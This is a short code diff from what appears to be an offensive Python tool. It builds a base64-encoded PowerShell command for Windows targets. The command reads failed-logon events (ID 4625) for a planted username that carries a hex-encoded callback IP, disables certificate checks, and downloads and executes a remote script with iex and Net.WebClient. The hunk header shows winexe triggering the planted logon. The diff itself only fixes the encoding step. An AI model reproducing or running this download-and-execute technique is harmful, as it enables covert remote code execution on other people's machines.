@@ -59,7 +59,7 @@ winexe -U FailName@7F000001%password //192.168.0.100
             messageblock = '''if(wevtutil qe security /rd:true /f:text /c:1 /q:\"*[System/EventID=4625]\" | findstr /i %s){$x=(wevtutil qe security /rd:true /f:text /c:1 /q:\"*[System/EventID=4625]\" | findstr /i %s).split('@');[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object Net.WebClient).DownloadString('https://0x'+$x[1]+':%s/%s')}''' % (FailName,FailName,callback_port,callback_file)
 
 
-        encodedmessage = b64encode(messageblock.encode('UTF-16LE'))
+        encodedmessage = b64encode(messageblock.encode('UTF-16LE')).decode()
 
          
         data= '''
